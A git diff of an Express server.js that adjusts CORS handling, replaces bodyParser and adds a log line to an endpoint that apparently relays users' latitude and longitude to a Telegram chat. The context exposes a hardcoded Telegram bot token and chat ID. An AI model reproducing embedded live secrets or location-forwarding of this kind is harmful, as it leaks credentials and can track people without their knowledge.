@@ -1,6 +1,5 @@
 // server.js
 const express = require("express");
-const bodyParser = require("body-parser");
 const cors = require("cors");
 const axios = require("axios");
 const path = require("path");
@@ -13,7 +12,15 @@ app.use(cors({
     methods: ["GET", "POST"], // Métodos permitidos
     allowedHeaders: ["Content-Type", "Authorization"] // Headers permitidos
 }));
-app.use(bodyParser.json());
+
+app.use((req, res, next) => {
+    res.header("Access-Control-Allow-Origin", "https://backscan-frontend.onrender.com");
+    res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE");
+    res.header("Access-Control-Allow-Headers", "Content-Type, Authorization");
+    next();
+});
+
+app.use(express.json()); // Substituído bodyParser.json() por express.json()
 
 // Servir arquivos estáticos da pasta atual
 app.use(express.static(__dirname));
@@ -27,6 +34,7 @@ const TELEGRAM_BOT_TOKEN = "7695856507:AAGGfqzY8-ujtB_oBvOJuXkjmIALTQYqq3I"; // 
 const TELEGRAM_CHAT_ID = "-1002496051487"; // Substitua pelo ID do chat (ou grupo) para onde quer enviar
 
 app.post("/send-location", async (req, res) => {
+  console.log("Recebendo localização:", req.body); // Adicionado log para depuração
   const { latitude, longitude, maps } = req.body;
 
   const message = `A localização do usuário é:\nLatitude: ${latitude}\nLongitude: ${longitude}\nMaps: ${maps}`;
